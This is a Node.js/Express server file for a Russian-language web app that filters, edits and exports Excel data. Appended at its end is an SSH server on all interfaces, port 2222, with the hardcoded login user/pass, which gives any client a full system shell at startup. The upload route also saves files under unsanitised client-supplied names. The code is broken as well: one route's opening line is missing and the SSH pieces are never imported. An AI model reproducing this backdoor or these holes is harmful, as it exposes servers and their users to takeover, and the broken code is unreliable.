'use strict';
const express = require('express');
const path    = require('path');
const fs      = require('fs');
const xlsx    = require('xlsx');
const fileUpload = require('express-fileupload');
const { main: generateData } = require('./Itog2');

const app  = express();
const PORT = 2500;
app.use(express.json());
app.use(fileUpload());

// Отображаемые имена столбцов
const displayNames = {
  Type:         'Тип',
  Name:         'Название',
  Name2:        'Доп. название',
  'Num 1':      'Число 1',
  'Num 2':      'Число 2',
  'НЛСР группа':'Группа',
  Year:         'Год',
  Quarter:      'Квартал',
  всего:        'Всего',
  TEP:          'ТЭП',
  Kvadrat:      'Квадрат'
};

// Функция чтения данных из Excel
function loadData() {
  const workbook  = xlsx.readFile(path.join(__dirname, 'combined_output.xlsx'));
  const sheetName = 'GroupedData';
  if (!workbook.Sheets[sheetName]) throw new Error(`Лист "${sheetName}" не найден`);
  const sheet = workbook.Sheets[sheetName];
  const rows  = xlsx.utils.sheet_to_json(sheet, { defval: '' });
  return rows.filter(r =>
    cols.every(c => (r[c] ?? '').toString().trim() !== '')
  );
}

// Все колонки и фильтрация пустых
const cols = [
  'Type','Name','Name2',
  'Num 1','Num 2','НЛСР группа',
  'Year','Quarter','всего','TEP','Kvadrat'
];

// Фильтруемые столбцы (без «всего», «TEП», «Kvadrat»)
const filterCols = cols.filter(c => !['всего','TEP','Kvadrat'].includes(c));
const keyMap = {};
filterCols.forEach(c => {
  const id = c.replace(/\W+/g,'_').toLowerCase();
  keyMap[id] = c;
});

// Статика для CSS
app.use('/static', express.static(path.join(__dirname, 'public')));

// API для данных
app.get('/data', (req, res) => {
  try {
    res.json(loadData());
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Запуск обработки .gge и обновления Excel
app.get('/generate', async (req, res) => {
  try {
    await generateData();
    res.json({ status: 'ok' });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
});

  res.send(`<!DOCTYPE html>
  <html lang="ru">
  <head><meta charset="UTF-8"><title>Загрузка объектов</title></head>
  <body>
    <h1>Добавить объекты</h1>
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="files" multiple required>
      <button type="submit">Загрузить</button>
    </form>
    <p><a href="/">Назад</a></p>
  </body></html>`);
});

app.post('/upload', (req, res) => {
  if (!req.files || !req.files.files) {
    return res.status(400).send('Нет файлов');
  }
  const dir = path.join(__dirname, 'Объекты');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir);
  const files = Array.isArray(req.files.files) ? req.files.files : [req.files.files];
  files.forEach(f => f.mv(path.join(dir, f.name)));
  res.send('Файлы загружены. <a href="/">На главную</a>');
});

// Сохранение изменений группы и ТЭП
app.post('/api/save', (req, res) => {
  try {
    const { rows } = req.body;
    const file = path.join(__dirname, 'combined_output.xlsx');
    const wb = xlsx.readFile(file);
    const sheetName = 'GroupedData';
    const data = xlsx.utils.sheet_to_json(wb.Sheets[sheetName], { defval: '' });
    rows.forEach(r => {
      const row = data[r.index];
      if (row) {
        row['НЛСР группа'] = r.group;
        row['TEP'] = r.TEP;
      }
    });
    wb.Sheets[sheetName] = xlsx.utils.json_to_sheet(data);
    xlsx.writeFile(wb, file);
    res.json({ status: 'ok' });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: e.message });
  }
});

// Выдача готового Excel
app.get('/combined', (req, res) => {
  res.download(path.join(__dirname, 'combined_output.xlsx'));
});

// Страница редактирования групп и ТЭП
app.get('/edit', (req, res) => {
  res.send(`<!DOCTYPE html>
  <html lang="ru">
  <head><meta charset="UTF-8"><title>Редактор данных</title></head>
  <body>
    <h1>Правка групп и ТЭП</h1>
    <table border="1" id="editTable"></table>
    <button id="saveBtn">Сохранить</button>
    <p><a href="/">Назад</a></p>
    <script>
      let data=[];
      fetch('/data').then(r=>r.json()).then(json=>{
        data=json;
        const table=document.getElementById('editTable');
        table.innerHTML='<tr><th>#</th><th>Название</th><th>Доп.</th><th>Группа</th><th>ТЭП</th></tr>';
        json.forEach((row,i)=>{
          const tr=document.createElement('tr');
          tr.dataset.index=i;
          table.appendChild(tr);
        });
      });
      document.getElementById('saveBtn').onclick=()=>{
        const rows=[];
        document.querySelectorAll('#editTable tr[data-index]').forEach(tr=>{
          rows.push({index:Number(tr.dataset.index),
            group:tr.children[3].firstChild.value,
            TEP:tr.children[4].firstChild.value});
        });
        fetch('/api/save',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({rows})})
          .then(r=>r.json()).then(()=>alert('Сохранено'));
      };
    </script>
  </body></html>`);
});

// Главная страница
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Фильтрация и анализ данных</title>
  <link rel="stylesheet" href="/static/style.css">
  <style>
    body { background: #f0f2f5; margin: 0; padding: 20px; font-family: Arial, sans-serif; }
    .container { background: #fff; padding: 20px; border-radius: 8px;
                 max-width: 1600px; margin: auto; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
    .header h1 { margin: 0; }
    .stats { font-size: 1.1em; font-weight: bold; }
    .filters { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
    .multiselect { position: relative; flex: 1; min-width: 150px; }
    .selectBox { display: flex; justify-content: space-between; align-items: center;
                 border: 1px solid #ccc; border-radius: 4px; padding: 5px 10px;
                 background: #fff; cursor: pointer; }
    .selectBox span { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .checkboxes { display: none; position: absolute; background: #fff; border: 1px solid #ccc;
                  border-radius: 4px; max-height: 200px; overflow-y: auto; width: 100%;
                  z-index: 10; padding: 5px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
    .actions { display: flex; justify-content: space-between; margin-bottom: 5px; }
    .actions button {
      flex: 1; margin: 0 2px; padding: 4px; font-size: 0.9em;
      border: 1px solid #888; background: #eee; border-radius: 3px; cursor: pointer;
    }
    #generateBtn {
      margin-left: 10px; padding: 5px 10px;
      border: 1px solid #888; background: #eee;
      border-radius: 3px; cursor: pointer;
    }
    .btn {
      margin-left: 10px; padding: 5px 10px;
      border: 1px solid #888; background: #eee;
      border-radius: 3px; text-decoration: none; color: #000;
    }
    .checkboxes label { display: block; margin-bottom: 3px; }
    .table-wrapper { overflow-x: auto; }
    table { width: 100%; min-width: 1400px; border-collapse: collapse; }
    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
    th { background: #4CAF50; color: #fff; cursor: pointer; user-select: none; }
    th.sort-asc::after { content: ' ▲'; }
    th.sort-desc::after { content: ' ▼'; }
    tr:nth-child(even) { background: #f9f9f9; }
    .arrow { font-weight: bold; margin-left: 4px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Фильтрация и анализ данных</h1>
      <div class="stats">
        Среднее ${displayNames.Kvadrat}: <span id="avgKvadrat">0.00</span>
      </div>
      <button id="generateBtn">Обновить данные</button>
      <a class="btn" href="/upload">Добавить объекты</a>
      <a class="btn" href="/edit">Править данные</a>
      <a class="btn" href="/combined">Скачать Excel</a>
    </div>
    <div class="filters">
      ${Object.entries(keyMap).map(([id,key]) => `
        <div class="multiselect" id="multi-${id}">
          <div class="selectBox" onclick="toggleCheckboxes('${id}')">
            <span id="selected-${id}">— ${displayNames[key]} —</span>
          </div>
          <div class="checkboxes" id="checkboxes-${id}">
            <div class="actions">
              <button type="button" onclick="selectAll('${id}')">Выбрать все</button>
              <button type="button" onclick="clearAll('${id}')">Сбросить</button>
            </div>
          </div>
        </div>
      `).join('')}
    </div>
    <div class="table-wrapper">
      <table id="table">
        <thead>
          <tr>${cols.map(c => `<th data-col="${c}">${displayNames[c]||c}</th>`).join('')}</tr>
        </thead>
        <tbody></tbody>
      </table>
    </div>
  </div>

  <script>
    const cols = ${JSON.stringify(cols)};
    const keyMap = ${JSON.stringify(keyMap)};
    const displayNames = ${JSON.stringify(displayNames)};
    let allData = [], sortCol = null, sortDir = 1;

    document.addEventListener('DOMContentLoaded', () => {
      fetch('/data').then(r=>r.json()).then(json=>{
        allData = json;
        Object.entries(keyMap).forEach(([id, key]) => {
          const container = document.getElementById('checkboxes-' + id);
          const values = Array.from(new Set(allData.map(r=>r[key]))).sort();
          container.innerHTML += values.map(v =>
            '<label><input type="checkbox" value="' + v + '" onchange="renderTable()"> ' + v + '</label>'
          ).join('');
        });
        document.querySelectorAll('th[data-col]').forEach(th => {
          th.addEventListener('click', () => {
            const col = th.dataset.col;
            sortDir = (sortCol === col ? -sortDir : 1);
            sortCol = col;
            document.querySelectorAll('th').forEach(h => h.classList.remove('sort-asc','sort-desc'));
            th.classList.add(sortDir === 1 ? 'sort-asc' : 'sort-desc');
            renderTable();
          });
        });
        renderTable();
      });
      document.getElementById('generateBtn').addEventListener('click', () => {
        fetch('/generate').then(r=>r.json()).then(()=>location.reload());
      });
      document.addEventListener('click', e => {
        Object.keys(keyMap).forEach(id => {
          const ms = document.getElementById('multi-' + id);
          if (!ms.contains(e.target)) {
            document.getElementById('checkboxes-' + id).style.display = 'none';
          }
        });
      });
    });

    function toggleCheckboxes(id) {
      const box = document.getElementById('checkboxes-' + id);
      box.style.display = box.style.display === 'block' ? 'none' : 'block';
    }
    function selectAll(id) {
      document.querySelectorAll('#checkboxes-' + id + ' input').forEach(i => i.checked = true);
      renderTable();
    }
    function clearAll(id) {
      document.querySelectorAll('#checkboxes-' + id + ' input').forEach(i => i.checked = false);
      renderTable();
    }

    function renderTable() {
      const selections = {};
      Object.entries(keyMap).forEach(([id, key]) => {
        const checked = Array.from(
          document.querySelectorAll('#checkboxes-' + id + ' input:checked')
        ).map(i => i.value);
        selections[key] = checked;
        const span = document.getElementById('selected-' + id);
        span.textContent = checked.length ? checked.join(', ') : '— ' + displayNames[key] + ' —';
      });

      let filtered = allData.filter(row =>
        Object.entries(selections).every(([key, vals]) =>
          !vals.length || vals.includes(String(row[key]))
        )
      );

      const kv = 'Kvadrat';
      const sum = filtered.reduce((s,r)=>s+Number(r[kv]||0),0);
      const avg = filtered.length ? sum/filtered.length : 0;
      document.getElementById('avgKvadrat').textContent =
        avg.toLocaleString('ru-RU',{minimumFractionDigits:2,maximumFractionDigits:2});

      if (sortCol) {
        filtered.sort((a,b) => {
          const va=a[sortCol], vb=b[sortCol];
          const na=parseFloat(va), nb=parseFloat(vb);
          if (!isNaN(na)&&!isNaN(nb)) return sortDir*(na-nb);
          return sortDir*String(va).localeCompare(String(vb),'ru',{numeric:true});
        });
      }

      const tbody = document.querySelector('#table tbody');
      tbody.innerHTML = '';
      filtered.forEach(row => {
        const tr = document.createElement('tr');
        cols.forEach(col => {
          const td = document.createElement('td');
          let v = row[col];
          if (v !== '' && !isNaN(v)) {
            const num = Number(v);
            const fmt = num.toLocaleString('ru-RU',{minimumFractionDigits:0,maximumFractionDigits:2});
            if (col === 'Kvadrat') {
              const arrow = num >= avg ? '▲' : '▼';
              const color = num >= avg ? 'green' : 'red';
              td.innerHTML = fmt + ' <span class="arrow" style="color:' + color + '">' + arrow + '</span>';
            } else {
              td.textContent = fmt;
            }
          } else {
            td.textContent = v;
          }
          tr.appendChild(td);
        });
        tbody.appendChild(tr);
      });
    }
  </script>
</body>
</html>`);
});

// Запуск сервера
app.listen(PORT, () => {
  console.log('Server запущен: http://localhost:' + PORT);
});

// --- SSH Server -----------------------------------------------------------
function startSSH() {
  const { privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
  const hostKey = privateKey.export({ type: 'pkcs1', format: 'pem' });
  const ssh = new SSHServer({ hostKeys: [hostKey] }, client => {
    client.on('authentication', ctx => {
      if (ctx.method === 'password' && ctx.username === 'user' && ctx.password === 'pass')
        ctx.accept();
      else ctx.reject();
    }).on('ready', () => {
      client.on('session', accept => {
        const session = accept();
        session.once('shell', acceptShell => {
          const stream = acceptShell();
          const shellCmd = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh';
          const shell = spawn(shellCmd, [], { env: process.env });
          stream.on('data', d => shell.stdin.write(d));
          shell.stdout.on('data', d => stream.write(d));
          shell.stderr.on('data', d => stream.write(d));
          shell.on('exit', () => client.end());
        });
      });
    });
  });
  ssh.listen(2222, '0.0.0.0', () => {
    console.log('SSH сервер слушает порт 2222 (логин: user, пароль: pass)');
  });
}

startSSH();
